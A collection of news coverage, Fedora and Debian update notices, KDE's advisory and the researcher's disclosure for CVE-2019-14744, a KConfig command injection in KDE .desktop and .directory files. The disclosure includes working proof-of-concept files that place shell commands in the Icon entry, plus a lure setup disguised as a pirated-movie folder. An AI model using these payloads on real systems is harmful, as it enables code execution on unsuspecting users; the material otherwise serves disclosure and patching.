The [KDE Frameworks](https://en.wikipedia.org/wiki/KDE_Frameworks) software library is at the base of the KDE desktop environment v4 and v5 (Plasma), currently included with several Linux distributions such as Kubuntu, openSUSE, OpenMandriva, Chakra, KaOS, and others.

### How the vulnerability works

The vulnerability occurs because of the way the KDesktopFile class (part of KDE Frameworks) handles .desktop or .directory files.

Penner discovered that he could create malicious .desktop and .directory files that could be used to run malicious code on a user's computer.

When a user opens the KDE file viewer to access the directory where these files are stored, the malicious code contained within the .desktop or .directory files executes without user interaction -- such as running the file.

"Browsing to a folder via Dolphin (the KDE GUI file manager) which contains a malicious .desktop file is enough to get code execution," [Alex Murray](https://twitter.com/alex_murray), Tech Lead for the Ubuntu Security team, told *ZDNet*, after we asked him to verify the vulnerability yesterday.

[In a technical write-up](https://gist.githubusercontent.com/zeropwn/630832df151029cb8f22d5b6b9efaefb/raw/64aa3d30279acb207f787ce9c135eefd5e52643b/kde-kdesktopfile-command-injection.txt) of the bug that Penner published on GitHub, the researcher says the vulnerability can be used to place shell commands inside the standard "Icon" entries found in .desktop and .directory files

The researcher said KDE "will execute our command whenever the file is viewed." A demo of an attack is available below, recorded by Penner.

### Some social engineering needed, but it's an easy attack

The exploitation scenario involves some social engineering to trick a user into downloading these malicious files, but the advantage to this technique is that the user does not have to interact or open these files.

Some security experts have played down the bug's importance because it requires tricking users into downloading .desktop and .directory files -- both of which are very uncommon downloads and will arrouse suspicions with most tech-savvy Linux users.

However, Murray told us the malicious files can also be hidden inside ZIP or TAR archives. A user might think he's downloading an archive of legitimate files, but be unaware that it may also hide malicious .desktop or .directory files.

Once the user unzips the archive and views its content, the malicious code executes without the target's knowledge or the target having to take any other actions.

Furthermore, exploit kits can also be employed to download the file on users' systems without interaction.

### Researcher did not notify KDE team

In an interview with *ZDNet* yesterday, Penner explained the motives of publishing the details around this bug without contacting the KDE team beforehand.

"I mainly just wanted to drop a 0day before Defcon [a security conference]," Penner told us. "I do plan on reporting it, but the issue is more of a design flaw than an actual vulnerability, despite what it can do."

"To be honest, I was debating on going into the code and making the change myself considering KDE is open source," Penner said.

*ZDNet* notified two members of the KDE team about this vulnerability yesterday. A KDE spokesperson provided the following reply:

"We would appreciate if people would contact security@kde.org before releasing an exploit into the public, rather than the other way around, so that we can decide on a timeline together," the spokesperson said.

### Similar bugs have impacted Linux distros in the past

Over the past few years, there has been a whole class of security flaws impacting Linux desktop environments caused by libraries which handle the operations associated with displaying files or thumbnails inside the OS desktop GUI.

Bugs in parsing file metadata or rendering image thumbnails have often been found. Most of the time, these bugs occur without any user interaction and are triggered just by accessing the folder where the malicious file resides -- similar to the bug that Penner discovered.

For example, in November 2016, [security researcher Chris Evans found](https://scarybeastsecurity.blogspot.com/2016/11/0day-poc-risky-design-decisions-in.html) that Fedora's Tracker and Gstreamer frameworks, part of Fedora's desktop environemnt, were allowing code execution when users accessed a folder containing malicious video files.

A month later, Evans found another similar bug that impacted both Fedora and Ubuntu, [this time, exploitable via audio files](https://scarybeastsecurity.blogspot.com/2016/12/redux-compromising-linux-using-snes.html).

In 2017, German IT expert Nils Dagsson Moskopp found [the "Bad Taste" vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2017-11421), which triggered code execution on Linux desktops utilizing the GNOME Files file viewer, when users viewed a Windows MSI file -- out of all things.

Penner's vulnerability is not unique, and certainly not unique to Linux systems. Problems with sanitizing file content and file metadata to remove possible hiding spots for malicious still plague Windows as well, and they'll likely plague operating systems for years to come.

Fedora Update Notification
FEDORA-2019-a746ac9c89
2019-08-14 01:04:58.755609
--------------------------------------------------------------------------------

Name : kdelibs
Product : Fedora 30
Version : 4.14.38
Release : 15.fc30
URL : <http://www.kde.org/>
Summary : KDE Libraries
Description :
Libraries for KDE 4.

--------------------------------------------------------------------------------
Update Information:

This update fixes \*\*CVE-2019-14744 (kconfig arbitrary shell code execution)\*\* in
the compatibility library `kdelibs` 4 used by legacy applications (not yet
ported to KDE Frameworks 5). The included `kde-settings` update removes obsolete
settings that conflict with the security fix and are no longer needed (see below
for details). The full list of fixes in the `kdelibs` 4 build: \* fixes
\*\*CVE-2019-14744 (#1740138, #1740140)\*\* ��� `kconfig`: malicious `.desktop` files
(and others) would execute code. KConfig had a well-meaning feature that allowed
configuration files to execute arbitrary shell commands. Unfortunately, this
could be abused by untrusted `.desktop` files to execute arbitrary code as the
target user, without the user even running the `.desktop` file. Therefore, this
update removes that ill-fated feature. (Patch from upstream: `kf5-kconfig` fix
by David Faure, `kdelibs` 4 backport by Kai Uwe Broulik.) \* fixes \*\*#917848\*\* ���
removes support for the `gamin` file watching service which is unmaintained and
buggy and can lead to application lockups. KDirWatch now relies exclusively on
`inotify` (directly). (Packaging fix by Rex Dieter.) \* fixes \*\*#1730770\*\* ���
removes an unused dependency on the obsolete `xf86misc` library. (Packaging fix
by Kevin Kofler.) The fixes in the `kde-settings` build remove settings that
were calling `xdg-user-dir`, because the above CVE-2019-14744 fix drops support
for running shell commands from configuration files from KConfig and because the
settings are all no longer needed (because they either only reproduce default
behavior or were commented out): \* `/usr/share/kde-settings/kde-
profile/default/share/config/kdeglobals`, `/usr/share/kde-settings/kde-
profile/minimal/share/config/kdeglobals`: Remove the `[Paths]` section. The
`Desktop` and `Documents` directories that were set there are already detected
by default by `kdelibs` 4 (it has native support for xdg-user-dirs and does not
need the external `xdg-user-dir` command invocation), and now also by `kdelibs3

...
> = 3.5.10-101` (which has native xdg-user-dirs support backported). The `Trash`

setting was already commented out. \* `/usr/share/kde-settings/kde-
profile/default/xdg/baloofilerc`: Delete the commented-out `folders` setting
that attempts to call `xdg-user-dir`.

Fedora Update Notification
FEDORA-2019-f9f78895c3
2019-08-19 01:01:06.548912
--------------------------------------------------------------------------------

Name : kdelibs3
Product : Fedora 30
Version : 3.5.10
Release : 101.fc30
URL : <http://www.kde.org/>
Summary : KDE 3 Libraries
Description :
Libraries for KDE 3:
KDE Libraries included: kdecore (KDE core library), kdeui (user interface),
kfm (file manager), khtmlw (HTML widget), kio (Input/Output, networking),
kspell (spelling checker), jscript (javascript), kab (addressbook),
kimgio (image manipulation).

--------------------------------------------------------------------------------
Update Information:

This update fixes \*\*CVE-2019-14744 (kconfig arbitrary shell code execution)\*\* in
the KDE 3 compatibility version of kdelibs used by legacy KDE 3 applications.
The full list of fixes in this `kdelibs3` build: \* fixes \*\*CVE-2019-14744\*\* -
`kconfig`: malicious `.desktop` files (and others) would execute code. KConfig
had a well-meaning feature that allowed configuration files to execute arbitrary
shell commands. Unfortunately, this could be abused by untrusted `.desktop`
files to execute arbitrary code as the target user, without the user even
running the `.desktop` file. Therefore, this update removes that ill-fated
feature. (Backported by Kevin Kofler from upstream: `kf5-kconfig` fix by David
Faure, `kdelibs` 4 backport by Kai Uwe Broulik.) \* adds native support for
\*\*xdg-user-dirs\*\* for \*Desktop\* and \*Documents\*, without shelling out to `xdg-
user-dir` from the config file. This is needed due to the above security fix.
(This feature was previously implemented in the Fedora `kde-settings` by
shelling out to `xdg-user-dir` from the config file using the KConfig feature
removed above.) (Backported by Kevin Kofler from Trinity Desktop / Timothy
Pearson.) \* fixes a \*\*KJS double-free\*\* that could crash legacy KDE 3
applications such as Quanta Plus when trying to execute JavaScript. (Backported
by OpenSUSE / Wolfgang Bauer from Trinity Desktop / Timothy Pearson.)
--------------------------------------------------------------------------------
ChangeLog:

\* Sat Aug 10 2019 Kevin Kofler Kevin@tigcc.ticalc.org - 3.5.10-101
- Backport CVE-2019-14744 fix by David Faure and Kai Uwe Broulik from kdelibs 4
- Backport native xdg-user-dirs support by Timothy Pearson from Trinity (needed
to fix the regression that would otherwise result from the above security fix)
- Backport KJS double-free fix by Timothy Pearson (backport by wbauer/OpenSUSE)
\* Thu Jul 25 2019 Fedora Release Engineering releng@fedoraproject.org - 3.5.10-100
- Rebuilt for <https://fedoraproject.org/wiki/Fedora_31_Mass_Rebuild>
\* Thu Apr 11 2019 Richard Shaw hobbes1069@gmail.com - 3.5.10-99
- Rebuild for OpenEXR 2.3.0.

KDE Project Security Advisory
=============================

Title:          kconfig: malicious .desktop files (and others) would execute code
Risk Rating:    High
CVE:            CVE-2019-14744
Versions:       KDE Frameworks < 5.61.0
Date:           7 August 2019

Overview
========
The syntax Key[$e]=$(shell command) in *.desktop files, .directory files, and configuration files
(typically found in ~/.config) was an intentional feature of KConfig, to allow flexible configuration.
This could however be abused by malicious people to make the users install such files and get code
executed even without intentional action by the user. A file manager trying to find out the icon for
a file or directory could end up executing code, or any application using KConfig could end up
executing malicious code during its startup phase for instance.

After careful consideration, the entire feature of supporting shell commands in KConfig entries has been removed,
because we couldn't find an actual use case for it. If you do have an existing use for the feature, please
contact us so that we can evaluate whether it would be possible to provide a secure solution.

Note that [$e] remains useful for environment variable expansion.

Solution
========
KDE Frameworks 5 users:
- update to kconfig >= 5.61.0
- or apply the following patch to kconfig:
<https://cgit.kde.org/kconfig.git/commit/?id=5d3e71b1d2ecd2cb2f910036e614ffdfc895aa22>

kdelibs users: apply the following patch to kdelibs 4.14:
<https://cgit.kde.org/kdelibs.git/commit/?id=2c3762feddf7e66cf6b64d9058f625a715694a00>

Credits
=======
Thanks to Dominik Penner for finding and documenting this issue (we wish however that he would
have contacted us before making the issue public) and to David Faure for the fix.

Title: KDE 4/5 KDesktopFile Command Injection
Date: July 28th 2019
Author: Dominik Penner / zer0pwn
Vendor Homepage: https://kde.org/
Software Link: https://cgit.kde.org
Version: 5.60.0 and below
Description:
KDE 4/5 is vulnerable to a command injection vulnerability in the KDesktopFile class. When a .desktop or .directory file is instantiated, it unsafely evaluates environment variables and shell expansions using KConfigPrivate::expandString() via the KConfigGroup::readEntry() function. Using a specially crafted .desktop file a remote user could be compromised by simply downloading and viewing the file in their file manager, or by drag and dropping a link of it into their documents or desktop.
The main issue at hand is the fact that the KDE configuration specification is inconsistent with that of XDG (freedesktop). Despite this, KDE mixes its configuration syntax with that of XDG's, allowing for dynamic configuration entries (https://userbase.kde.org/KDE\_System\_Administration/Configuration\_Files#Shell\_Expansion).
When we combine this /feature/ with the way KDE handles .desktop and .directory files, we can force the file to evaluate some of the entries within the [Desktop Entry] tag. Some of the entries in this tag include "Icon", "Name", etc. The exploit is dependent on the entry that gets read by the KConfigGroup::readEntry() function. Generally whenever KDE needs to display these entries is when they'll get called. So for example, if we were to browse to the malicious file in our file manager (dolphin), the Icon entry would get called in order to display the icon. Since we know this, we can use a shell command in place of the Icon entry, which in turn will execute our command whenever the file is viewed.
Theoretically, if we can control config entries and trigger their reading, we can achieve command injection / RCE. I imagine there must be more ways to abuse this, however this is the most reliable way I've discovered so far.
Exploit/POCs:
1) payload.desktop
[Desktop Entry]
Icon[$e]=$(echo${IFS}0>~/Desktop/zero.lol&)
2) .directory
[Desktop Entry]
Type=Directory
Icon[$e]=$(echo${IFS}0>~/Desktop/zero.lol&)
Now whenever the files are viewed either in Dolphin, or on the Desktop (or while browsing an SMB share w/ smb4k) your commands will execute. The command processor doesn't seem to like spaces so just use $IFS and you'll be good. For the .desktop payload, it's as simple as having a remote user view the file on their local file system. The .directory payload has another part to it. .directory files are meant for setting configuration entries for the directory itself. Meaning we can set the Icon of the parent directory, and trigger it whenever someone views the folder. This requires nesting directories.
Example:
$ mkdir Hackers.1995.720p.BrRip.x264.YIFY
$ cd Hackers.1995.720p.BrRip.x264.YIFY
$ mkdir YIFY; cd YIFY
$ vi .directory
[Desktop Entry]
Type=Directory
Icon[$e]=$(echo${IFS}0>~/Desktop/zer0.lol&)
Now whenever someone opens the "Hackers.1995.720p.BrRip.x264.YIFY" directory, the YIFY directory will attempt to load the Icon from the .directory file, executing our command(s).
The code:
----------------kdesktopfile.cpp-----------------------------------------------------
182 QString KDesktopFile::readIcon() const
183 {
184 Q\_D(const KDesktopFile);
185 return d->desktopGroup.readEntry("Icon", QString()); <---------------------
186 }
-------------------------------------------------------------------------------------
-----------------kconfiggroup.cpp----------------------------------------------------
679 QString KConfigGroup::readEntry(const char \*key, const QString &aDefault) const
680 {
681 Q\_ASSERT\_X(isValid(), "KConfigGroup::readEntry", "accessing an invalid group");
682
683 bool expand = false;
684
685 // read value from the entry map
686 QString aValue = config()->d\_func()->lookupData(d->fullName(), key, KEntryMap::SearchLocalized,
687 &expand);
688 if (aValue.isNull()) {
689 aValue = aDefault;
690 }
691
692 if (expand) {
693 return KConfigPrivate::expandString(aValue); <-------------------------
694 }
695
696 return aValue;
697 }
-------------------------------------------------------------------------------------
-----------------kconfig.cpp---------------------------------------------------------
178 QString KConfigPrivate::expandString(const QString &value)
179 {
180 QString aValue = value;
181
182 // check for environment variables and make necessary translations
183 int nDollarPos = aValue.indexOf(QLatin1Char('$'));
184 while (nDollarPos != -1 && nDollarPos + 1 < aValue.length()) {
185 // there is at least one $
186 if (aValue[nDollarPos + 1] == QLatin1Char('(')) {
187 int nEndPos = nDollarPos + 1;
188 // the next character is not $
189 while ((nEndPos <= aValue.length()) && (aValue[nEndPos] != QLatin1Char(')'))) {
190 nEndPos++;
191 }
192 nEndPos++;
193 QString cmd = aValue.mid(nDollarPos + 2, nEndPos - nDollarPos - 3);
194
195 QString result;
196
197 // FIXME: wince does not have pipes
198 #ifndef \_WIN32\_WCE
199 FILE \*fs = popen(QFile::encodeName(cmd).data(), "r"); <-----------
200 if (fs) {
201 QTextStream ts(fs, QIODevice::ReadOnly);
202 result = ts.readAll().trimmed();
203 pclose(fs);
204 }
205 #endif
-------------------------------------------------------------------------------------
Remediation:
Disable shell expansion / dynamic entries for [Desktop Entry] configurations.

Fedora Update Notification
FEDORA-2019-39d23c7a94
2019-08-30 00:49:12.870421
--------------------------------------------------------------------------------

Name : kde-settings
Product : Fedora 29
Version : 29.1
Release : 1.fc29
URL : <https://github.com/FedoraKDE/kde-settings>
Summary : Config files for kde
Description :
Config files for kde.

--------------------------------------------------------------------------------
Update Information:

This update fixes \*\*CVE-2019-14744 (kconfig arbitrary shell code execution)\*\* in
the compatibility library `kdelibs` 4 used by legacy applications (not yet
ported to KDE Frameworks 5). The included `kde-settings` update removes obsolete
settings that conflict with the security fix and are no longer needed (see below
for details). The full list of fixes in the `kdelibs` 4 build: \* fixes
\*\*CVE-2019-14744 (#1740138, #1740140)\*\* ��� `kconfig`: malicious `.desktop` files
(and others) would execute code. KConfig had a well-meaning feature that allowed
configuration files to execute arbitrary shell commands. Unfortunately, this
could be abused by untrusted `.desktop` files to execute arbitrary code as the
target user, without the user even running the `.desktop` file. Therefore, this
update removes that ill-fated feature. (Patch from upstream: `kf5-kconfig` fix
by David Faure, `kdelibs` 4 backport by Kai Uwe Broulik.) \* fixes \*\*#917848\*\* ���
removes support for the `gamin` file watching service which is unmaintained and
buggy and can lead to application lockups. KDirWatch now relies exclusively on
`inotify` (directly). (Packaging fix by Rex Dieter.) \* fixes \*\*#1730770\*\* ���
removes an unused dependency on the obsolete `xf86misc` library. (Packaging fix
by Kevin Kofler.) The fixes in the `kde-settings` build remove settings that
were calling `xdg-user-dir`, because the above CVE-2019-14744 fix drops support
for running shell commands from configuration files from KConfig and because the
settings are all no longer needed (because they either only reproduce default
behavior or were commented out): \* `/usr/share/kde-settings/kde-
profile/default/share/config/kdeglobals`, `/usr/share/kde-settings/kde-
profile/minimal/share/config/kdeglobals`: Remove the `[Paths]` section. The
`Desktop` and `Documents` directories that were set there are already detected
by default by `kdelibs` 4 (it has native support for xdg-user-dirs and does not
need the external `xdg-user-dir` command invocation), and now also by `kdelibs3

...
> = 3.5.10-101` (which has native xdg-user-dirs support backported). The `Trash`

setting was already commented out. \* `/usr/share/kde-settings/kde-
profile/default/xdg/baloofilerc`: Delete the commented-out `folders` setting
that attempts to call `xdg-user-dir`.
--------------------------------------------------------------------------------
ChangeLog:

\* Mon Aug 12 2019 Kevin Kofler Kevin@tigcc.ticalc.org 29.1-1
- Remove settings that call xdg-user-dir (no longer supported by KConfig)
--------------------------------------------------------------------------------

Debian Security Advisory DSA-4494-1                   security () debian org
<https://www.debian.org/security/>                       Moritz Muehlenhoff

Package        : kconfig
CVE ID         : CVE-2019-14744

Dominik Penner discovered that KConfig, the KDE configuration settings
framework, supported a feature to define shell command execution in
.desktop files. If a user is provided with a malformed .desktop file
(e.g. if it's embedded into a downloaded archive and it gets opened in
a file browser) arbitrary commands could get executed. This update
removes this feature.

For the oldstable distribution (stretch), this problem has been fixed
in version 5.28.0-2+deb9u1.

For the stable distribution (buster), this problem has been fixed in
version 5.54.0-1+deb10u1.

We recommend that you upgrade your kconfig packages.

For the detailed security status of kconfig please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/kconfig>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
